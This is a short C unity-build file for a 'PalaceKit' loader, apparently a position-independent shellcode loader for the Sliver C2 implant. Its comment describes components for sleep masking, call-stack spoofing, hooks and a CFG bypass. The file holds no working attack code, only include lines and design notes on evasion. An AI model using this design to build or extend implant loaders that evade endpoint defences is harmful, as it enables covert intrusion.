/*
 * unity.c — Single-TU build for PalaceKit loader.
 *
 * Including all sources into one translation unit ensures that accesses to
 * globals like _NtAllocateVirtualMemory generate direct RIP-relative REL32
 * relocations (text→bss within the same .o file) instead of MinGW's
 * .refptr / ADDR64 cross-TU indirection, which requires runtime absolute
 * addresses incompatible with PIC shellcode.
 *
 * Link order:
 *   1. services.c  — NT function pointer globals + patch_resolve + resolve_all
 *   2. pico.c      — PICO blob accessor / no-op stubs
 *   3. hooks.c     — hook stubs (disabled for Sliver Go runtime)
 *   4. mask.c      — sleep-mask stubs (disabled; SleepKit handles this)
 *   5. spoof.c     — call-stack spoof stubs (disabled for Sliver)
 *   6. cfg.c       — CFG bypass stub (no-op without Win32 IAT)
 *   7. cleanup.c   — memory cleanup helpers
 *   8. loader.c    — go() entry point (uses all of the above)
 */
#include "services.c"
#include "pico.c"
#include "hooks.c"
#include "mask.c"
#include "spoof.c"
#include "cfg.c"
#include "cleanup.c"
#include "loader.c"
